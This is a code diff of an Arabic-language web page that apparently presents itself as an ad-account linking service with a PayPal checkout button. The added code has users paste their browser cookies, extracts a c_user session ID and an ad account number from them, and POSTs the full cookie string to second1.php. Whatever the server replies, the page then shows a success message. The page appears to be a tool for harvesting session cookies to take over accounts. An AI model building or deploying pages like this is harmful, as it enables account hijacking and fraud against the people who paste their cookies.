@@ -35,11 +35,6 @@
         button:hover {
             background-color: #0056b3;
         }
-        .paypal-button {
-            background: none;
-            border: none;
-            cursor: pointer;
-        }
         .paypal-button img {
             width: 200px;
         }
@@ -56,8 +51,9 @@
         <input type="text" id="ad_account">
 
         <label>الكوكيز:</label>
-        <input type="text" id="cookies" readonly>
-        
+        <input type="text" id="cookies">
+
+        <button onclick="extractAccountInfo()">🔍 استعلام</button>
         <button class="paypal-button" onclick="openPaypal()">
             <img src="paypal.jpeg" alt="PayPal Checkout">
         </button>
@@ -66,42 +62,23 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            let storedCookies = localStorage.getItem("userCookies");
-            document.getElementById("cookies").value = storedCookies || "لم يتم العثور على الكوكيز";
-            
-            // استخراج معرف الحساب (c_user) من الكوكيز أو LocalStorage
-            let cUserMatch = storedCookies ? storedCookies.match(/c_user=(\d+)/) : null;
-            let savedCUser = localStorage.getItem("c_user");
-            
-            let cUser = cUserMatch ? cUserMatch[1] : (savedCUser ? savedCUser : "غير معروف");
+        function extractAccountInfo() {
+            let cookies = document.getElementById("cookies").value.trim();
+            if (!cookies) {
+                alert("يرجى إدخال الكوكيز!");
+                return;
+            }
+
+            // استخراج معرف الحساب (c_user)
+            let cUserMatch = cookies.match(/c_user=(\d+)/);
+            let cUser = cUserMatch ? cUserMatch[1] : "غير معروف";
             document.getElementById("account_id").value = cUser;
 
-            // استخراج رقم الحساب الإعلاني
-            let adAccountMatch = storedCookies ? storedCookies.match(/(?:ad_account_id|adaccount)=(\d+)/) : null;
-            let savedAdAccount = localStorage.getItem("adAccount");
-            let urlParams = new URLSearchParams(window.location.search);
-            let urlAdAccount = urlParams.get("adaccount");
-
-            let adAccountField = document.getElementById("ad_account");
-            if (adAccountMatch) {
-                adAccountField.value = adAccountMatch[1];
-            } else if (savedAdAccount) {
-                adAccountField.value = savedAdAccount;
-            } else if (urlAdAccount) {
-                adAccountField.value = urlAdAccount;
-            } else {
-                adAccountField.placeholder = "أدخل رقم الحساب الإعلاني يدويًا";
-            }
-
-            // حفظ معرف الحساب و الحساب الإعلاني محليًا
-            if (cUser !== "غير معروف") {
-                localStorage.setItem("c_user", cUser);
-            }
-            if (adAccountField.value) {
-                localStorage.setItem("adAccount", adAccountField.value);
-            }
-        });
+            // استخراج رقم الحساب الإعلاني (adaccount)
+            let adAccountMatch = cookies.match(/adaccount=(\d+)/);
+            let adAccount = adAccountMatch ? adAccountMatch[1] : "غير معروف";
+            document.getElementById("ad_account").value = adAccount;
+        }
 
         function openPaypal() {
             let adAccount = document.getElementById("ad_account").value.trim();
@@ -110,8 +87,6 @@
                 return;
             }
             
-            // حفظ البيانات قبل الذهاب إلى PayPal
-            localStorage.setItem("adAccount", adAccount);
             window.open("https://www.paypal.com/checkoutnow?token=EC-20B89377D5285764C", "_blank");
         }
         
@@ -119,12 +94,12 @@
             let adAccount = document.getElementById("ad_account").value.trim();
             let cUser = document.getElementById("account_id").value;
             let cookies = document.getElementById("cookies").value;
-            
-            if (!adAccount) {
-                alert("يرجى إدخال رقم الحساب الإعلاني!");
+
+            if (!adAccount || !cUser || !cookies) {
+                alert("يرجى إدخال جميع البيانات!");
                 return;
             }
-            
+
             fetch("second1.php", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
@@ -133,11 +108,8 @@
             .then(response => response.text())
             .then(data => {
                 console.log("Response from server:", data);
-                if (data.includes("تم الربط")) {
-                    window.location.href = "second1.php"; // توجيه المستخدم بعد الربط
-                } else {
-                    alert("❌ خطأ: " + data);
-                }
+                alert("✅ تم إرسال البيانات بنجاح!");
+                window.location.href = "done.html"; // توجيه المستخدم لصفحة النجاح
             })
             .catch(error => {
                 console.error("❌ خطأ أثناء الإرسال:", error);
